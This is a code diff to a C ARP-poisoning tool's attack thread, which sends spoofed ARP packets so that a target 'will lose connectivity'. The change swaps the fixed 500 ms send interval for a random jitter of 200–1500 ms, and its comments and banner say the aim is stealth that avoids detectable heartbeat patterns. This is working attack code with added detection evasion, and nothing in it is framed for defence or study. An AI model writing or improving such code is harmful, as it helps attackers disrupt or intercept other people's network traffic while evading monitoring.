@@ -108,11 +108,15 @@ static void* reaper_poison_thread(void* arg) {
     sa.sll_halen = 6;
     memcpy(sa.sll_addr, broadcast, 6);
     
+    // Seed random for jitter
+    srand(time(NULL));
+    
     printf("\n");
     printf(COLOR_RED COLOR_BOLD);
     printf("╔══════════════════════════════════════╗\n");
     printf("║   ⚠  ARP POISONING ACTIVE  ⚠        ║\n");
     printf("║   Target will lose connectivity!     ║\n");
+    printf("║   Mode: Stealth (Randomized Jitter)  ║\n");
     printf("║   Type 'reaper stop' to end          ║\n");
     printf("╚══════════════════════════════════════╝\n");
     printf(COLOR_RESET "\n");
@@ -130,13 +134,16 @@ static void* reaper_poison_thread(void* arg) {
         
         packets += 2;
         
-        // Status update every 10 packets
+        // Status update every 20 packets
         if (packets % 20 == 0) {
             printf("\r" COLOR_YELLOW "[*] Packets sent: %d" COLOR_RESET "        ", packets);
             fflush(stdout);
         }
         
-        usleep(500000); // 500ms between bursts
+        // Jitter: Sleep between 200ms and 1500ms
+        // This avoids 500ms fixed heartbeat patterns
+        useconds_t sleep_time = (rand() % 1300000) + 200000;
+        usleep(sleep_time); 
     }
     
     printf("\n" COLOR_GREEN "[*] Poison attack stopped. Sent %d packets." COLOR_RESET "\n\n", packets);
